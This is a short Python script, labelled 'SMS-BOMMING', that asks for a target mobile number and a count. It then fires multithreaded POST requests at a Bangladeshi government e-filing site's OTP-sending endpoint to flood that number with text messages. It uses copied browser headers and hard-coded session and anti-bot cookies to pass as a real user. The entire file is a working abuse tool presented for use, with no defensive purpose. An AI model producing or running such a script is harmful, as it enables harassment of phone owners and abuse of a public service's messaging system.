# SMS-BOMMING
import requests
from concurrent.futures import ThreadPoolExecutor

# Input mobile number and number of requests
mobile_number = input("Enter mobile number: ")
num_requests = int(input("Enter number of requests to send: "))

url = "https://efiling.ebmeb.gov.bd/index.php/eiinsim/sendotp"

headers = {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://efiling.ebmeb.gov.bd",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "referer": "https://efiling.ebmeb.gov.bd/index.php/eiinsim/applicationform",
    "sec-ch-ua": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
}

cookies = {
    "__nobotA2": "CgAC02i8kXhmqgAHA5G1Ag==",
    "ci_session": "8dbada59b153e03dcdcfe05e90d3300b272992a9",
}

data = {
    "mobile": mobile_number
}

def send_request(i):
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        print(f"[{i+1}] Response: {response.text}")
    except Exception as e:
        print(f"[{i+1}] Error: {e}")

# Use ThreadPoolExecutor for multi-threading
with ThreadPoolExecutor(max_workers=50) as executor:  # you can increase workers for more speed
    executor.map(send_request, range(num_requests))
